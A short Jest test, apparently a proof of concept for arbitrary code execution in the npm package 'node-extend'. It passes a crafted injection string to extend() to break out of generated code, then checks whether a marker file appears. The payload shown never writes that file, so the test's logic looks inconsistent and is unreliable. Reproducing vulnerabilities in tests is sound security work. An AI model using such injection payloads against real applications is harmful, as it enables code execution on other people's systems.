test("Arbitrary code execution in node-extend", () => {
  expect.assertions(2);
  const fs = require("fs");
  const extend = require("node-extend");
  const path = "./node-extend";
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    foo = extend(
      "function (){});throw new Error(); //(){console.log(123)}",
      ""
    );
  } catch (error) {
    console.log("Start Error")
    console.log(error)
    console.log("End Error");
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
